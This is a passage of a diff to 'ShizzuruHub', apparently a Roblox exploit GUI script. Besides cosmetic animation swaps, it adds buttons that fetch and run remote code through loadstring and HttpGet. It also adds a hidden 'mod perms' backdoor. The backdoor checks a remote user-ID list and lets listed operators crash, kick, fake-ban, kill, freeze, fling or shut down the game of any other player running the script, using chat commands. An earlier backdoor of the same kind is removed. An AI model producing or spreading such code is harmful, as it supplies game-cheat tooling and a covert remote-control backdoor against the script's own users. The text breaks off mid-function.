-            v:Stop() 
-            end
-            tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
-            tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
-            tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
-            tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
-            tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
-            tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
-            tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
-            tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-            tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-            tomtoediendo:FindFirstChild("Animate").Disabled = false
-            end)
-
- Animations:Button(
-      "Kinght",
-   function()   
+TabA:Button("SuperHero",function()
     local tomtoediendo = game.Players.LocalPlayer.Character
-    tomtoediendo:FindFirstChild("Animate").Disabled = true 
-    for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-    v:Stop() 
-    end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
-    tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-    tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-    tomtoediendo:FindFirstChild("Animate").Disabled = false
-    end)
-
-    Animations:Button(
-        "Elder",
-     function()   
-        local tomtoediendo = game.Players.LocalPlayer.Character
-        tomtoediendo:FindFirstChild("Animate").Disabled = true 
-        for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-        v:Stop() 
-        end
-        tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
-        tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
-        tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
-        tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
-        tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
-        tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
-        tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
-        tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-        tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-        tomtoediendo:FindFirstChild("Animate").Disabled = false
-        end)
-
-Animations:Button(
-       "Toy",
-     function()
-        local tomtoediendo = game.Players.LocalPlayer.Character
-    tomtoediendo:FindFirstChild("Animate").Disabled = true 
-    for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
-    v:Stop() 
-    end
-    tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
-    tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
-    tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
-    tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
-    tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
-    tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
-    tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
-    tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
-    tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
-    tomtoediendo:FindFirstChild("Animate").Disabled = false
-    end)
-
-local Server = serv:Channel("Rejoin")
-
-    Server:Button(
-    "Rejoin",
-    function()
-local ts = game:GetService("TeleportService")
-local p = game:GetService("Players").LocalPlayer
-ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
 end
-)
-
-Server:Button(
-    "ServerHop",
-    function()
-    for fe, fg in pairs(game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
-            if fg.playing ~= fg.maxPlayers then
-              game:service("TeleportService"):TeleportToPlaceInstance(game.PlaceId, fg.id)
-            end
-          end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
 end)
 
+TabA:Button("Kinght",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Elder",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Astronaut",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabA:Button("Bubbly",function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+TabE:Label("Extra")
+TabE:Button("Rejoin",function()
+    local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.15
+        notifSound.SoundId = "rbxassetid://876800936"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+        local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(143.932, 50.5, -217.049)
+
+        local TeleportService = game:GetService("TeleportService")
+        local ts = game:GetService("TeleportService")
+local p = game:GetService("Players").LocalPlayer
+ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
+end)
+TabE:Button("Server Hop",function()
+    for fe, fg in pairs(game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
+        if fg.playing ~= fg.maxPlayers then
+          game:service("TeleportService"):TeleportToPlaceInstance(game.PlaceId, fg.id)
+        end
+      end
+end)
+TabE:Label("Admin-Scripts")
+TabE:Button("Admin Iv",function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v2.lua'))()
+   end)
+TabE:Button("Infinite-Yield",function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+   end)
+TabE:Button("CMD-X",function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
+end)
+TabE:Button("Nameless-Admin",function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
+   end)
+TabE:Button("Fates Admin",function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+end)
+-----------------------------------------------------------------------------
+--Credits Tab
+-------------------------------------------------------------------------------
+TabCR:Label("Credits")
+TabCR:Button("kyu_000 | Owner Scripting",function()
+     setclipboard("kyu_000")
+    game.StarterGui:SetCore('SendNotification', {
+        Title = 'ShizzuruHub',
+        Text = 'Link copied to clipboard.'
+    })
+end)
+TabCR:Button("Click To copy Discord Server",function()
+    setclipboard('https://discord.gg/PJKw5MjUCx')
+    game.StarterGui:SetCore('SendNotification', {
+        Title = 'ShizzuruHub',
+        Text = 'Link copied to clipboard.'
+    })
+end)
+------------------------------------------------------------------------------------------------------------------------------------------------
+--UI Settings
+------------------------------------------------------------------------------------------------------------------------------------------------
+--\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\--
+TabM:Keybind("Toggle",Enum.KeyCode.V,function()
+    Library:Toggle()
+end)
+--\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\--
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+--Notifacation
+--------------------------------------------------------------------------------------------------------------------------------------------------
+   game.StarterGui:SetCore('SendNotification', {
+    Title = 'ShizzuruHub',
+    Text = 'Loaded, Enjoy |  V1.1',
+    Icon = 'http://www.roblox.com/asset/?id=14290674733'
+})
+game.StarterGui:SetCore('SendNotification', {
+    Title = 'Announcements:',
+    Text = 'Enjoy New & Improved ShizzuruHub'
+})
+setfpscap(999)
+
 -- // mod perms
---Open source
-local players = game:GetService("Players")
-local player = players.LocalPlayer
-local onben = false
 
-local TestPerson = Instance.new("Player")
-TestPerson.Name = "Cpixell"
-TestPerson.Parent = game.Players
-
-coroutine.wrap(function()
-    pcall(function()
-        task.wait(15)
-        TestPerson:Destroy()
-    end)
-end)()
-
-local PremList = {
-    2924306911,
-    1322643777,
-    2250634441,
-    2278716443,
-    1678248866,
-    2241756235,
-    2448201786,
-    3878503910,
-    637217349,
-    2477537459,
-    3321189625,
-    666;
-}
-
-local adminlist = {
-    143961241,
-}
-
-
-local jumpscares = {
-    10755920324,
-    1119705746,
-    12213285275,
-    12293699441,
-    10727260846,
-    12342625873,
-    8804558033;
-}
-local memes = {
-    8373881910,
-    7279156932,
-    11648246803,
-    928967808,
-    9260491536,
-    551973081,
-    8863809025,
-    11569839895;
-}
-
-local function offragdoll()
-    pcall(function()
-        player.Character:FindFirstChild("Falling down").Disabled = true
-        player.Character:FindFirstChild("Swimming").Disabled = true
-        player.Character:FindFirstChild("StartRagdoll").Disabled = true
-        player.Character:FindFirstChild("Pushed").Disabled = true
-        player.Character:FindFirstChild("KillScript").Disabled = true
-        player.Character:FindFirstChild("RagdollMe").Disabled = true
-    end)
+local url = game:HttpGet("https://raw.githubusercontent.com/Atlasv1/Atlasv1/main/Premiun%20List")
+local isamod = false
+if string.find(url,game.Players.LocalPlayer.UserId) then
+    isamod = true
 end
 
-local function onragdoll()
-    pcall(function()
-        player.Character:FindFirstChild("Falling down").Disabled = false
-        player.Character:FindFirstChild("Swimming").Disabled = false
-        player.Character:FindFirstChild("StartRagdoll").Disabled = false
-        player.Character:FindFirstChild("Pushed").Disabled = false
-        player.Character:FindFirstChild("KillScript").Disabled = false
-        player.Character:FindFirstChild("RagdollMe").Disabled = false
-    end)
-end
+local player = game.Players.LocalPlayer
+local prefix = "z."
+function ban()
+    ScreenGui = Instance.new("ScreenGui")
+    Frame = Instance.new("Frame")
+    TextLabel = Instance.new("TextLabel")
 
-local function getcommand(plr, msg)
-    local admin = game:GetService("Players"):GetPlayerByUserId(plr)
-    local cmd = msg:lower()
-    local SplitCMD = string.split(cmd," ")
-    local LowerN, LowerD = string.lower(player.Name), string.lower(player.DisplayName)
-    local ISPREMTOO = table.find(PremList, player.UserId)
-    local ISADMIN = table.find(adminlist, admin.UserId)
-    pcall(function()
-        local Allowed = string.find(LowerN, SplitCMD[2]) or string.find(LowerD, SplitCMD[2]) or false
-        if Allowed then
-            if string.find(SplitCMD[1], "-user") then
-                if not ISPREMTOO or ISADMIN then
-                    local args = {[1] = ("/w "..admin.Name.." i'm using Zytek"),[2] = "All"}
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+    ScreenGui.Parent = game.CoreGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    Frame.Parent = ScreenGui
+    Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Frame.Position = UDim2.new(0.063149482, 0, 0.0797545984, 0)
+    Frame.Size = UDim2.new(0, 100, 0, 100)
+    Frame.BackgroundTransparency = 1
+
+    TextLabel.Parent = Frame
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.new(4.36999989, 0, 0.5, 0)
+    TextLabel.Size = UDim2.new(0, 200, 0, 50)
+    TextLabel.SizeConstraint = Enum.SizeConstraint.RelativeXX
+    TextLabel.Font = Enum.Font.SourceSans
+    TextLabel.TextColor3 = Color3.fromRGB(194, 0, 0)
+    TextLabel.TextSize = 35.000
+    TextLabel.Text = "Jail Timer: 9999999999999"
+end
+local fucking = false
+local function cmds(msg,plr)
+    local operator = game.Players:GetPlayerByUserId(plr)
+    msg = string.split(msg," ")
+    msg[1] = string.lower(msg[1])
+    if not isamod then
+        if msg[1] == prefix.."bring" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
+            end
+        elseif msg[1] == prefix.."freeze" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            elseif msg[1] == prefix.."unfreeze" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+        elseif msg[1] == prefix.."fling" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                for i=1,math.random(99,100) do
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(1000,9999),math.random(1000,9999),math.random(1000,9999))
+                    wait()
                 end
             end
-            if string.find(SplitCMD[1], "-freeze") then
+        elseif msg[1] == prefix.."kick" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                if msg[3] == nil then
+                    msg[3] = "owner has kicked you, ggx"
+                end
+                player:Kick(msg[3])
+            end
+            elseif msg[1] == prefix.."tik" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                 pcall(function()
+                local ts = game:GetService("TeleportService")
+                local p = game:GetService("Players").LocalPlayer
+                ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
+                end)
+            end
+        elseif msg[1] == prefix.."fakeban" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player:Kick("PERMA-BAN")
+                wait(1)
+                while true do end -- just incase they got anti kick
+            end
+        elseif msg[1] == prefix.."crash" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                while true do end
+            end
+        elseif msg[1] == prefix.."bug" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("MeshPart") or v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then 
+                        pcall(function()
+                            v:Destroy()
+                        end)
+                    end
+                end
+            end
+            elseif msg[1] == prefix.."sun" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 pcall(function()
                     for i,v in pairs(player.Character:GetChildren()) do
                         if v:IsA("Part") or v:IsA("BasePart") then
-                            v.Anchored = true
+                            v.Velocity = Vector3.new(0,2000,0)
                         end
                     end
                 end)
             end
-            if string.find(SplitCMD[1], "-unfreeze")  or string.find(SplitCMD[1], "m!nofreeze") then
-                pcall(function()
-                    for i,v in pairs(player.Character:GetChildren()) do
-                        if v:IsA("Part") or v:IsA("BasePart") then
-                            v.Anchored = false
-                        end
-                    end
-                end)
-            end
-            if string.find(SplitCMD[1], "-kick") then
-                if not ISPREMTOO or ISADMIN then
-                    pcall(function()
-                        player:Kick("Kicked by: "..admin.Name.."")
-                    end)
-                    task.wait(1)
-                    while true do end
+        elseif msg[1] == prefix.."user" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+            local text   = ""
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+local function say() 
+Event:FireServer(text, "All")
+end
+text = "I you use ShizzuruHub" say()
+      end
+        elseif msg[1] == prefix.."pepper" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                local OFF = Instance.new("ScreenGui")
+                local Frame = Instance.new("Frame")
+                
+                local Name_ = math.random(99,25252).."+++".."lol" 
+                OFF.Name = Name_
+                OFF.Parent = game.CoreGui
+                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                            
+                Frame.Parent = OFF
+                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+                Frame.BackgroundColor3 = Color3.fromRGB(255,140,0)
+                Frame.BorderColor3 = Color3.fromRGB(255,140,0)
+                Frame.Transparency = 0.8
+                Frame.BorderSizePixel = 100
+                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                Frame.Size = UDim2.new(1, 0, 1, 0)
+                
+                for i=1,5 do
+                    game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health-20
+                    wait(1.4)
                 end
+                game.Players.LocalPlayer.CharacterAdded:Wait()
+                game.CoreGui:FindFirstChild(Name_):Destroy()
             end
-            if string.find(SplitCMD[1], "-bring") then
-                if not ISPREMTOO or ISADMIN then
-                    pcall(function()
-                        player.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
-                    end)
+        elseif msg[1] == prefix.."flash" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                local OFF = Instance.new("ScreenGui")
+                local Frame = Instance.new("Frame")
+                           
+                local Name_ = math.random(99,25252).."+++".."lol" 
+                OFF.Name = Name_
+                OFF.Parent = game.CoreGui
+                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                            
+                Frame.Parent = OFF
+                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+                Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
+                Frame.BorderColor3 = Color3.fromRGB(255,255,255)
+                Frame.BorderSizePixel = 100
+                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                Frame.Size = UDim2.new(1, 0, 1, 0)
+                for i=1,100 do
+                    Frame.Transparency = Frame.Transparency+0.01
+                    wait(.1)
                 end
+                game.CoreGui:FindFirstChild(Name_):Destroy()
             end
-            if string.find(SplitCMD[1], "-fling") then
+        elseif msg[1] == prefix.."kill" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            end
+            elseif msg[1] == prefix.."nerk" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then  
+                player.Character.Humanoid.Health = 2
+            end
+            elseif msg[1] == prefix.."gravity" then
+            if string.sub(string.lower(player.name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                 pcall(function()
-                    for i,v in pairs(player.Character:GetChildren()) do
-                        if v:IsA("Part") or v:IsA("BasePart") then
-                            v.Velocity = Vector3.new(1000000000000,1000000000000,1000000000000)
-                        end
-                    end
+                 game.Workspace.Gravity = 20   
                 end)
             end
-            if string.find(SplitCMD[1], "-sun") then
+            elseif msg[1] == prefix.."ungravity" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                 pcall(function()
-                    for i,v in pairs(player.Character:GetChildren()) do
-                        if v:IsA("Part") or v:IsA("BasePart") then
-                            v.Velocity = Vector3.new(0,1000,0)
-                        end
-                    end
+                 game.Workspace.Gravity = 196.2 
                 end)
             end
-            if string.find(SplitCMD[1], "-sit") then
+            elseif msg[1] == prefix.."slow" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                 pcall(function()
-                    player.Character.Humanoid.Sit = true
+                    player.Character.Humanoid.WalkSpeed = 1
                 end)
             end
-            if string.find(SplitCMD[1], "-bug") then
-                if not ISPREMTOO or ISADMIN then
-                    pcall(function()
-                        player:Destroy()
-                    end)
-                end
-            end
-            if string.find(SplitCMD[1], "-slow") then
-                pcall(function()
-                    player.Character.Humanoid.WalkSpeed = 3
-                end)
-            end
-            if string.find(SplitCMD[1], "-unslow") or string.find(SplitCMD[1], "m!noslow") then
+            elseif msg[1] == prefix.."unslow" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                 pcall(function()
                     player.Character.Humanoid.WalkSpeed = 16
                 end)
             end
-            if string.find(SplitCMD[1], "-jump") then
-                pcall(function()
-                    player.Character.Humanoid:ChangeState(3)
-                end)
+            elseif msg[1] == prefix.."sit" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 player.Character.Humanoid.Sit = true
             end
-            if string.find(SplitCMD[1], "-kill") then
-                pcall(function()
-                    player.Character.Humanoid.Health = 0
-                end)
+            elseif msg[1] == prefix.."exit" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 game:Shutdown()
             end
-            if string.find(SplitCMD[1], "-crash") then
-                if not ISPREMTOO or ISADMIN then
-                    pcall(function()
-                        while true do end
-                    end)
-                end
+            elseif msg[1] == prefix.."ds" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 game.Players.LocalPlayer.Character.Animate.Disabled = true
             end
-            if string.find(SplitCMD[1], "-benx") then
-                if not ISPREMTOO or ISADMIN then
-                    onben = true
-                    offragdoll()
-                    repeat task.wait()
-                        pcall(function()
-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -1.3) * CFrame.Angles(-1.5,math.rad(0),0)
-                            task.wait(); player.Character.Humanoid.Sit = true; player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -1.8) * CFrame.Angles(-1.5,math.rad(0),0)
-                            task.wait(); player.Character.Humanoid.Sit = true; player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -2.3) * CFrame.Angles(-1.5,math.rad(0),0)
-                            task.wait(); player.Character.Humanoid.Sit = true; player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -2.8) * CFrame.Angles(-1.5,math.rad(0),0)
-                            task.wait(); player.Character.Humanoid.Sit = true; player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -2.3) * CFrame.Angles(-1.5,math.rad(0),0)
-                            task.wait(); player.Character.Humanoid.Sit = true; player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
